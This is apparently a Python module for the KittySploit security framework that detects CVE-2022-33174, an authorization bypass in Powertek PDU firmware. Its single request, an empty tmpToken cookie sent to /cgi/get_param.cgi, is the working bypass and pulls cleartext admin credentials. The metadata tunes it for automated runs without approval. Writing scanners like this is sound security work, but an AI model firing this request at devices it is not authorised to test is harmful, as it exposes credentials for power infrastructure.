#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Powertek firmware (multiple brands) before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Powertek Firmware <3.30.30 - Authorization Bypass Detection',
        'description': 'Powertek firmware (multiple brands) before 3.30.30 running Power Distribution Units are vulnerable to authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'powertek', 'auth-bypass', 'powertekpdus', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gynvael.coldwind.pl/?lang=en&id=748',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-33174',
            'https://github.com/Henry4E36/CVE-2022-33174',
            'https://github.com/k0mi-tg/CVE-POC',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2022-33174',
    }

    def run(self):
        path = '/cgi/get_param.cgi?xml&sys.passwd&sys.su.name'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'tmpToken=;'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<sys.passwd>', '<sys.su.name>',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Powertek Firmware <3.30.30 - Authorization Bypass detected', path=path)
            return True
        return False

